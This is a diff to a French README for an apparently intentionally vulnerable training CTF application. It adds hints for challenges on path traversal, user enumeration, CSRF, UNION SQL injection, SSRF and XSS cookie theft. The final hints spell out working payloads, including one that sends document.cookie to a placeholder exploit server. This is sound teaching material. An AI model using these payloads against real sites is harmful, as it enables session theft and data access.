@@ -2,7 +2,7 @@
 
 ## Challenges
 
-Les 7 challenges sont classés par difficulté croissante. Chaque flag est au format `ASY{...}`.
+Les 15 challenges sont classés par difficulté croissante. Chaque flag est au format `ASY{...}`.
 
 ---
 
@@ -149,4 +149,130 @@ Essayez de poster un avis contenant du HTML, par exemple <code>&lt;b&gt;test&lt;
 <details>
 <summary>Hint 3</summary>
 <code>&lt;img src=x onerror="fetch('/api/xss-flag').then(r=>r.json()).then(d=>document.title=d.flag)"&gt;</code>
+</details>
+
+---
+
+### Challenge #8 — Path Traversal (Facile)
+
+> Les chemins mènent parfois plus loin que prévu...
+
+<details>
+<summary>Hint 1</summary>
+L'application a un endpoint pour récupérer des fichiers. Regardez les endpoints liés aux produits.
+</details>
+
+<details>
+<summary>Hint 2</summary>
+<code>GET /api/products/image?file=organic.txt</code> — que se passe-t-il si vous remontez dans l'arborescence ?
+</details>
+
+<details>
+<summary>Hint 3</summary>
+<code>GET /api/products/image?file=../../secret_flag.txt</code>
+</details>
+
+---
+
+### Challenge #9 — User Enumeration (Facile)
+
+> Le serveur en dit trop quand on frappe à la mauvaise porte.
+
+<details>
+<summary>Hint 1</summary>
+Essayez de vous connecter avec un nom d'utilisateur qui n'existe pas, puis avec un qui existe mais un mauvais mot de passe. Les messages d'erreur sont-ils identiques ?
+</details>
+
+<details>
+<summary>Hint 2</summary>
+Cherchez des endpoints liés à l'authentification qui pourraient révéler des informations.
+</details>
+
+<details>
+<summary>Hint 3</summary>
+<code>GET /api/auth/exists?username=admin</code>
+</details>
+
+---
+
+### Challenge #10 — CSRF (Moyen)
+
+> Quand un autre site agit en votre nom...
+
+<details>
+<summary>Hint 1</summary>
+L'application n'a aucune protection CSRF. Le cookie de session est envoyé automatiquement par le navigateur.
+</details>
+
+<details>
+<summary>Hint 2</summary>
+Créez une page HTML qui soumet un formulaire POST vers l'API de transfert de crédits. Hébergez-la sur l'exploit-server.
+</details>
+
+<details>
+<summary>Hint 3</summary>
+Utilisez la page "CSRF Demo" de l'exploit-server pour générer le payload automatiquement. Le flag apparaît quand le transfert provient d'un autre site (Origin cross-origin).
+</details>
+
+---
+
+### Challenge #11 — SQL Injection UNION (Difficile)
+
+> Quand une requête en cache une autre...
+
+<details>
+<summary>Hint 1</summary>
+La recherche de produits est vulnérable à l'injection SQL. Essayez des caractères spéciaux dans la barre de recherche.
+</details>
+
+<details>
+<summary>Hint 2</summary>
+Utilisez UNION SELECT pour extraire des données d'autres tables. Combien de colonnes a la requête originale ?
+</details>
+
+<details>
+<summary>Hint 3</summary>
+<code>GET /api/products?search=' UNION SELECT 1,value,3,4,5,6 FROM secrets --</code>
+</details>
+
+---
+
+### Challenge #12 — SSRF (Difficile)
+
+> Le serveur fait confiance à vos URLs... même les internes.
+
+<details>
+<summary>Hint 1</summary>
+Cherchez un endpoint qui permet d'importer quelque chose depuis une URL externe.
+</details>
+
+<details>
+<summary>Hint 2</summary>
+L'endpoint d'import d'image effectue un fetch côté serveur. Que se passe-t-il si vous pointez vers localhost ?
+</details>
+
+<details>
+<summary>Hint 3</summary>
+<code>POST /api/products/1/image-url</code> avec <code>{"url": "http://localhost:3000/api/internal/flag"}</code>
+</details>
+
+---
+
+### Challenge #13 — Cookie Theft via XSS (Difficile)
+
+> Voler un cookie, c'est voler une identité.
+
+<details>
+<summary>Hint 1</summary>
+Le cookie de session n'est pas protégé par httpOnly. Il est accessible via JavaScript avec document.cookie.
+</details>
+
+<details>
+<summary>Hint 2</summary>
+Utilisez une XSS (réfléchie ou stockée) pour envoyer le cookie vers votre exploit-server (webhook).
+</details>
+
+<details>
+<summary>Hint 3</summary>
+Postez un avis contenant : <code>&lt;img src=x onerror="fetch('http://VOTRE-EXPLOIT-SERVER/steal?c='+document.cookie)"&gt;</code> — l'exploit-server détecte le JWT et donne le flag.
 </details>
